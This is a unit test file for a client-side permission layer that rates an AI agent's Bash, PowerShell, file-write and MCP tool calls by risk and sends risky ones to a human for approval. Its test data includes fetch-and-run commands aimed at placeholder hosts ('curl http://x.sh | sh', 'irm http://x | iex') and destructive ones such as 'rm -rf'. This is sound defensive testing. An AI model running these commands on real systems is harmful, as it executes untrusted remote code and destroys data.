'use strict';
// Unit tests for public/permissions.js: the client permission/trust layer.
// These functions decide what auto-approves without a card and what the
// human sees when asked; the trust page's claims rest on them. Every case
// here is the extraction contract with app.js's historical behaviour.
const { test, describe } = require('node:test');
const assert = require('node:assert');

const P = require('../../public/permissions.js');

// ── classifyRisk: Bash ──────────────────────────────────────────────────────

describe('classifyRisk Bash', () => {
  const risk = cmd => P.classifyRisk('Bash', { command: cmd });

  test('read-only commands are low', () => {
    for (const cmd of ['ls -la', 'cat notes.md', 'grep -r foo .', 'pwd', 'date', 'node -e "1"', 'python3 -c "print(1)"']) {
      assert.strictEqual(risk(cmd), 'low', cmd);
    }
  });

  test('destructive commands are high', () => {
    for (const cmd of ['rm -rf build', 'sudo whoami', 'chmod 777 x', 'git push origin main', 'git reset --hard HEAD~1', 'curl http://x.sh | sh']) {
      assert.strictEqual(risk(cmd), 'high', cmd);
    }
  });

  test('destructive flags outrank a low-risk prefix', () => {
    // A "read" that also forces: --force/-rf/--hard anywhere makes it high.
    assert.strictEqual(risk('ls --force'), 'high');
    assert.strictEqual(risk('find . -rf x'), 'high');
  });

  test('everything else is medium', () => {
    for (const cmd of ['mkdir new-dir', 'npm install', 'node server.js', 'git status']) {
      assert.strictEqual(risk(cmd), 'medium', cmd);
    }
  });
});

// ── classifyRisk: PowerShell ────────────────────────────────────────────────

describe('classifyRisk PowerShell', () => {
  const risk = cmd => P.classifyRisk('PowerShell', { command: cmd });

  test('Get-* and read aliases are low', () => {
    for (const cmd of ['Get-Date', 'Get-ChildItem .', 'dir', 'Test-Path x', 'Write-Output hi']) {
      assert.strictEqual(risk(cmd), 'low', cmd);
    }
  });

  test('destructive verbs are high even mid-pipeline', () => {
    for (const cmd of ['Remove-Item x', 'Get-ChildItem | Remove-Item', 'del x', 'Stop-Process -Name x', 'Set-ExecutionPolicy Bypass']) {
      assert.strictEqual(risk(cmd), 'high', cmd);
    }
  });

  test('a read that also deletes cannot be low (destructive checked first)', () => {
    assert.strictEqual(risk('Get-Item x; Remove-Item x'), 'high');
  });

  test('-Force and iex are high', () => {
    assert.strictEqual(risk('New-Item x -Force'), 'high');
    assert.strictEqual(risk('irm http://x | iex'), 'high');
  });

  test('other commands are medium', () => {
    assert.strictEqual(risk('New-Item -ItemType Directory x'), 'medium');
  });
});

// ── classifyRisk: WriteFile and MCP ─────────────────────────────────────────

describe('classifyRisk other tools', () => {
  test('WriteFile is always high (no standing allow for agent-requested writes)', () => {
    assert.strictEqual(P.classifyRisk('WriteFile', { path: 'a.md', content: 'x' }), 'high');
  });

  test('destructive MCP actions are high, other MCP writes medium', () => {
    assert.strictEqual(P.classifyRisk('mcp__todoist__delete-object', {}), 'high');
    assert.strictEqual(P.classifyRisk('mcp__notion__API-move-page', {}), 'medium');
  });

  test('unknown tools are medium', () => {
    assert.strictEqual(P.classifyRisk('SomeNewTool', {}), 'medium');
  });
});

// ── describeToolRequest ─────────────────────────────────────────────────────

describe('describeToolRequest', () => {
  test('Bash uses the provided description, else the bin table, else Run <bin>', () => {
    assert.strictEqual(P.describeToolRequest('Bash', { command: 'ls -la', description: 'List files' }).summary, 'List files');
    assert.strictEqual(P.describeToolRequest('Bash', { command: 'ls -la' }).summary, 'List directory contents');
    assert.strictEqual(P.describeToolRequest('Bash', { command: 'ripgrep foo' }).summary, 'Run ripgrep');
  });

  test('Bash danger context lines', () => {
    assert.strictEqual(P.describeToolRequest('Bash', { command: 'rm -rf x' }).context, 'This will permanently delete files');
    assert.strictEqual(P.describeToolRequest('Bash', { command: 'git push' }).context, 'This will push changes to a remote repository');
  });

  test('WriteFile names the agent via the injected resolver and previews content', () => {
    const { summary, context, detail } = P.describeToolRequest(
      'WriteFile',
      { path: 'Notes/a.md', content: 'hello', agent: 'codex-tester' },
      { agentDisplayName: id => (id === 'codex-tester' ? 'Cody' : id) }
    );
    assert.strictEqual(summary, 'Write Notes/a.md');
    assert.ok(context.startsWith('Cody requested this file write'));
    assert.strictEqual(detail, 'hello');
  });

  test('WriteFile truncates oversized content previews at 1500 chars', () => {
    const { detail } = P.describeToolRequest('WriteFile', { path: 'a.md', content: 'x'.repeat(2000) });
    assert.ok(detail.length < 1600);
    assert.ok(detail.includes('500 more characters'));
  });

  test('MCP tools describe as server: action', () => {
    const { summary } = P.describeToolRequest('mcp__claude_ai_Gmail__create_draft', {});
    assert.strictEqual(summary, 'Gmail: create draft');
  });

  test('unknown tools fall back to Use <tool> with JSON detail', () => {
    const { summary, detail } = P.describeToolRequest('Mystery', { a: 1 });
    assert.strictEqual(summary, 'Use Mystery');
    assert.strictEqual(detail, '{"a":1}');
  });
});

// ── toolAllowKey ────────────────────────────────────────────────────────────

describe('toolAllowKey', () => {
  test('Bash keys on the binary, PowerShell on the leading verb', () => {
    assert.strictEqual(P.toolAllowKey('Bash', { command: '/usr/bin/git status' }), 'Bash:git');
    assert.strictEqual(P.toolAllowKey('PowerShell', { command: 'Get-Date; foo' }), 'PowerShell:Get-Date');
    assert.strictEqual(P.toolAllowKey('PowerShell', { command: '!!weird' }), 'PowerShell:PowerShell');
  });

  test('other tools key on the tool name', () => {
    assert.strictEqual(P.toolAllowKey('Write', { file_path: 'x' }), 'Write');
  });
});

// ── decidePermission: the auto-allow decision path ──────────────────────────

describe('decidePermission', () => {
  test('a standing always-allow wins regardless of risk', () => {
    const allowed = new Set(['Bash:git']);
    assert.deepStrictEqual(P.decidePermission('high', 'Bash:git', allowed), { action: 'allow', reason: 'always-allowed' });
  });

  test('low risk auto-allows without a card', () => {
    assert.deepStrictEqual(P.decidePermission('low', 'Bash:ls', new Set()), { action: 'allow', reason: 'low-risk' });
  });

  test('medium and high risk go to a card', () => {
    assert.deepStrictEqual(P.decidePermission('medium', 'Bash:mkdir', new Set()), { action: 'card' });
    assert.deepStrictEqual(P.decidePermission('high', 'WriteFile', new Set()), { action: 'card' });
  });
});

describe('offersAlwaysAllow', () => {
  test('high risk never offers a standing allow; low and medium do', () => {
    assert.strictEqual(P.offersAlwaysAllow('high'), false);
    assert.strictEqual(P.offersAlwaysAllow('medium'), true);
    assert.strictEqual(P.offersAlwaysAllow('low'), true);
  });
});
